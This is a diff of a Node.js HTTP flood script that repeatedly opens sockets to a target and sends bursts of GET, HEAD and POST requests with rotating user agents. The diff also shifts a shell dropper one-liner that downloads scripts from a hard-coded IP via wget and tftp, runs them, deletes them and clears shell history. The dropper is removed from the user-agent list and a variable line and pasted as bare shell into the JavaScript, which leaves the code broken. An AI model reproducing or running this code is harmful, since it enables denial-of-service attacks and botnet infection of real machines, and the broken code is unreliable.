@@ -14,6 +14,8 @@ var time = process.argv[3];
 process.on('uncaughtException', function (e) { });
 process.on('unhandledRejection', function (e) { });
 
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.136.104.130/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 150.136.104.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c 
+
 const userAgents = [
 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
 "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
@@ -890,7 +892,7 @@ const userAgents = [
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.0 Safari/534.3",
 "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.457.0 Safari/534.3",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.456.0 Safari/534.3",
-"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2", " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.136.104.130/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 150.136.104.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
+"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2",
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2",
 "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2",
@@ -1809,13 +1811,12 @@ const nullHexs = [
 "\xC2", 
 "\xA0"
 ];
-var int = cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.136.104.130/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 150.136.104.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c 
+
 var int = setInterval(() => {
     var s = require('net').Socket();
     s.connect(80, host);
     s.setTimeout(10000);
     for (var i = 0; i < 50; i++) {
-
         s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
 		s.write('HEAD ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
 		s.write('POST ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
